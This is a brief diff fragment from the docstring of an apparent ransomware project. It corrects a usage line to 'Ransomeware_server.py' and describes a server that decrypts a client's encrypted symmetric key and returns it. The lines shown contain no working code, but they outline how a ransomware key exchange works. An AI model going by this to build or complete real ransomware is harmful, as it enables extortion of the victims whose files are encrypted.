@@ -15,7 +15,7 @@ This script will accept the EncryptedSymmetricKey (ESK) from the client script a
 Next, we will send the original symmetric key (SK) that we decrypted back to this client script.
 
 
-Usage: python3 Ransomeware_client.py
+Usage: python3 Ransomeware_server.py
 """
 
 
